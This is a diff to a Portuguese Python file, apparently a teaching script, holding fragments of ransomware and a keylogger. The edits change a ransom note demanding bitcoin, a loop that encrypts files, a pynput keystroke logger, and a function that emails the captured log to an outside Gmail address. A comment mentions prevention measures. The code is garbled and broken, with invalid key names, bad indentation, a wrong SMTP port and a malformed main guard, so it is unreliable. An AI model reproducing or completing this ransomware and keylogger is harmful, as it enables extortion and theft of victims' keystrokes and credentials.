@@ -43,8 +43,8 @@ def carregar_chave():
      def criar_mensagem_resgate():
          with open("LEIA ISSO.txt", "w") as f:
       f.write("Seus arquivos foram criptografados!\n")
-      f.write("Envia 3 bitcoin para o endereço X e envie o comprovante!\n")
-      f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")
+      f.write("Envia 3 bitcoin para o endereço XY e envie o comprovante!\n")
+      f.write("Após pagamento, enviaremos a chave para você recuperar seus dados!\n")
                 
   # Execução principal
     def main():
@@ -54,7 +54,7 @@ def carregar_chave():
        for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        criar_mensagem_resgate()
-      print("Ransoware executado! Arquivos criptografados!")
+      print("Ransoware executado!")
 
       if__name__== "__main__":
         main()
@@ -65,15 +65,14 @@ def carregar_chave():
 from pynput import keyboard
 
 IGNORAR = {keyboard.shift,
-keyboard.Key.shift_r,
-keyboard.Key.ctrl_l,
-keyboard.Key.ctrl_r
-keyboard.alt_r,
-keyboard.Key.alt_l,
+keyboard.Key.shift_y,
+keyboard.Key.ctrl_s,
+keyboard.Key.ctrl_l
+keyboard.alt_f,
+keyboard.Key.alt_b,
 keyboard.Key.caps_lock,
 keyboard.Key.cmd
- }
-
+ 
 def on_press(key):
  try:  
   # se for uma tecla "normal" (letra, número, símbolo) 
@@ -104,10 +103,10 @@ except.AttributeError:
 def enviar_email():
     with open("log.txt", "r") as f:
         conteudo = f.read()
-    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server = smtplib.SMTP("smtp.gmail.com", 777)
     server.starttls()
     server.login("pyy@gmail.com", "senha")
-    server.sendmail("pyy@gmail.com", "destino@gmail.com", conteudo)
+    server.sendmail("pyy@gmail.com", "miami@gmail.com", conteudo)
     server.quit()
 
  # Medidas de Prevenção
